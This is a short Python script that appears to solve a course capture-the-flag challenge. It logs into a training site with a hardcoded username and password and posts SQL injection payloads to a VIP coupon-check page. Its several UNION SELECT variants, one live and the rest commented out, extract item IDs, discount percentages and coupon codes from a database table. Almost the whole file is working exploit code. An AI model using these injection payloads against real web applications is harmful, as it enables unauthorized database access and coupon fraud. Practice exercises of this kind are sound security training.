import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck"

#postData = {"couponCode": "\' union select itemId,percentOff,CONCAT(\'itemID is: \',itemId,\'  percentOff is: \',percentOff, \' couponCode is: \', couponCode, \\' end \')  from vipCoupons; -- "}
#postData = {"couponCode": "\' OR \"1\" = \"1\" UNION SELECT itemId, couponCode, percentOff FROM vipCoupons WHERE percentOff = \"100\"; -- " }
#response2 = session.post(targetUrl, data=postData)
#print(response2.text)
#print(response2.headers)
#print(response2.cookies.__dict__)
postData = {"couponCode": "\' union select itemId,percentOff,CONCAT(\"itemID is: \",itemId,\"  percentOff is: \",percentOff, \" couponCode is: \", couponCode, \" end \")  from vipCoupons; -- "}
#postData = {"couponCode": "coupon\' UNION SELECT itemId, percentOff, couponCode FROM vipCoupons LIMIT 1 -- "}
#postData = {"couponCode": "\' OR \"1\" = \"1\" -- "}
#postData = {"couponCode": "\' UNION SELECT 1, 1, 1 -- "}
#for x in range(0,50):
#postData = {"couponCode":"\' UNION SELECT itemId, couponCode, percentOff FROM vipCoupons WHERE \"1\" = \"1\" -- "}
#postDat = {"couponCode":"\' 
response2 = session.post(targetUrl, data=postData)
print(response2.text)
